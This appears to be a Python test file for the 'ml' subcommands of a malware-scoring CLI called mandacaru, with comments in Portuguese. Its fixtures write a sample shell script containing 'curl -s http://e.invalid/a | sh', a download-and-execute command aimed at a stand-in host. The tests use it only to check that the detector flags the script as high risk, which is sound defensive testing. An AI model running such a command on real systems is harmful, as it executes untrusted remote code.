"""Comandos mandacaru ml status, avaliar e sombra."""
import argparse
import hashlib
import json

from ml_model import POLICY, model_dict, stump

from mandacaru.ml.cli import cmd_ml
from mandacaru.ml.features import SCRIPT_FEATURE_NAMES


def _modelos(tmp_path):
    i = SCRIPT_FEATURE_NAMES.index("baixa_e_executa")
    p = tmp_path / "script.json"
    # tmp_path fica dentro de /tmp: 4.0 (nota ~0.98) passa do alto_tmp de 0.97
    p.write_text(json.dumps(model_dict(family="script", kinds={"sh": dict(POLICY)},
                                       trees=[stump(i, 0.5, -5.0, 4.0)])))
    return {"script": hashlib.sha256(p.read_bytes()).hexdigest()}


def ns(tmp_path, **kw):
    base = dict(config=None, mcmd="status", arquivos=[], as_json=False, desde=None, arquivo=None,
                _models_dir=tmp_path, _pinned={})
    base.update(kw)
    return argparse.Namespace(**base)


def test_status_sem_modelo(tmp_path, capsys):
    assert cmd_ml(ns(tmp_path)) == 0 and "nenhum modelo instalado" in capsys.readouterr().out


def test_status_com_modelo_e_invalido(tmp_path, capsys):
    pinned = _modelos(tmp_path)
    assert cmd_ml(ns(tmp_path, _pinned=pinned)) == 0
    out = capsys.readouterr().out
    assert "script-teste" in out and "sh" in out
    assert cmd_ml(ns(tmp_path, _pinned={"script": "0" * 64})) == 4


def test_avaliar(tmp_path, capsys):
    pinned = _modelos(tmp_path)
    mal = tmp_path / "x.sh"
    mal.write_bytes(b"#!/bin/sh\ncurl -s http://e.invalid/a | sh\n")
    pdf = tmp_path / "d.pdf"
    pdf.write_bytes(b"%PDF-1.7")
    rc = cmd_ml(ns(tmp_path, mcmd="avaliar", arquivos=[str(mal), str(pdf)], _pinned=pinned))
    out = capsys.readouterr().out
    assert rc == 2 and "alto" in out and "nao avaliado (tipo nao suportado)" in out


def test_avaliar_json(tmp_path, capsys):
    pinned = _modelos(tmp_path)
    mal = tmp_path / "x.sh"
    mal.write_bytes(b"#!/bin/sh\ncurl -s http://e.invalid/a | sh\n")
    cmd_ml(ns(tmp_path, mcmd="avaliar", arquivos=[str(mal)], as_json=True, _pinned=pinned))
    [item] = json.loads(capsys.readouterr().out)
    assert item["band"] == "alto" and item["path"] == str(mal) and item["motivos"]


def test_sombra(tmp_path, capsys):
    log = tmp_path / "s.jsonl"
    log.write_text("\n".join(json.dumps({"ts": "2026-12-01T10:00:00+00:00", "path": f"/tmp/{i}", "band": b,
                    "score": s, "would_isolate": w, "motivos": []})
                    for i, (b, s, w) in enumerate([("alto", 0.99, True), ("medio", 0.6, False)])))
    assert cmd_ml(ns(tmp_path, mcmd="sombra", arquivo=str(log))) == 0
    out = capsys.readouterr().out
    assert "alto: 1" in out and "medio: 1" in out and "/tmp/0" in out
    assert cmd_ml(ns(tmp_path, mcmd="sombra", arquivo=str(log), desde="2026-12-02")) == 0
    assert "alto: 0" in capsys.readouterr().out
    assert cmd_ml(ns(tmp_path, mcmd="sombra", arquivo=str(tmp_path / "nada.jsonl"))) == 0
    assert "sem registros do modo sombra" in capsys.readouterr().out
